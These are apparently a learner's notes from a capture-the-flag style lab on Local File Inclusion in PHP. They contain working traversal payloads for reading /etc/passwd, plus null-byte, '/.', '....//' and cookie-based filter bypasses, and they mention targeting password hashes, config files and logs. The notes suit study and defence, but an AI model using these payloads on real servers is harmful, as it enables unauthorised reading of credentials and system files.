LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as **include**, **require**, **include_once**, and **require_once** often contribute to vulnerable web applications.

Can happen with PHP, ASP, JSP, Node.js... LFI exploits follow the same concepts as path traversal.

By including `/etc/passwd`, the attacker learns:

- Valid usernames (root, www-data, mysql, etc.)
    
- Which services are installed (e.g., mysql user means MySQL is present)
    
- System paths and structure
    

From there, an attacker might try to read:

- `/etc/shadow` (password hashes) – often not readable, but misconfigurations happen
    
- Source code of the web app (`.php`, `.inc` files)
    
- Log files (e.g., `/var/log/apache2/access.log`) to inject PHP code
    
- Configuration files with database passwords

**#1.** Suppose the web application provides two languages, and the user can select between the EN and AR

```php
<?PHP 
	include($_GET["lang"]);
?>
```

`http://webapp.thm/index.php?lang=EN.php` or `http://webapp.thm/index.php?lang=AR.php`

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the `/etc/passwd` file, which contains sensitive information about the users of the Linux operating system, we can try the following: `http://webapp.thm/get.php?file=/etc/passwd`


**#2.** Next, In the following code, the developer decided to specify the directory inside the function.

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

**#3.** In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

```php
arning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

**The error message discloses significant information. By entering as input, an error message shows what the include function looks like: `include(languages/THM.php);`.**

**Also, the error message disclosed another important piece of information about the full web application directory path which is `/var/www/html/THM-4/`.**

To exploit this, we need to use the `../` trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

It seems we could move out of the PHP directory but still, the include function reads the input with `.php` at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is 

`%00``include("languages/../../../../../etc/passwd%00").".php");` which is equivalent to `include("languages/../../../../../etc/passwd");`

**Note:** the %00 trick is fixed and not working with PHP 5.3.4 and above.

**#4.** In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword `/..` The exploit will be similar to `http://webapp.thm/index.php?lang=/etc/passwd/`. We could also use `http://webapp.thm/index.php?lang=/etc/passwd%00`.

To make it clearer, if we try this concept in the file system using `cd ..`, it will get you back one step; however, if you do `cd .`, It stays in the current directory. Similarly, if we try `/etc/passwd/..`, it results to be `/etc/` and that's because we moved one to the root. Now if we try `/etc/passwd/.`, the result will be `/etc/passwd` since dot refers to the current directory.


**#5.** Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

We got the following error!

```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 
```

look at include() eventho I typed ../../../../etc/passwd it only shows etc/passwd, it clearly "EATS" the filtered ../ 
So because of that we do ....//
It will eat the middle part that is filtered and leave ../


**#6.** Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: `http://webapp.thm/index.php?lang=languages/EN.php` then, to exploit this, we need to include the directory in the payload like so: `?lang=languages/../../../../../etc/passwd`.

Typing anything gets me error "Access Denied! Allowed files at THM-profile folder only!"

`http://10.114.188.66/lab6.php?file=/THM-profile/../../../../etc/passwd`

So we need to start from that point



POST /challenges/chall1.php HTTP/1.1
Host: 10.114.136.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

file=test

**Cookie-based LFI** — you might face prefix + suffix + filter all at once. Test each separately, then combine."

Cookie: THM=../../../../etc/flag2%00/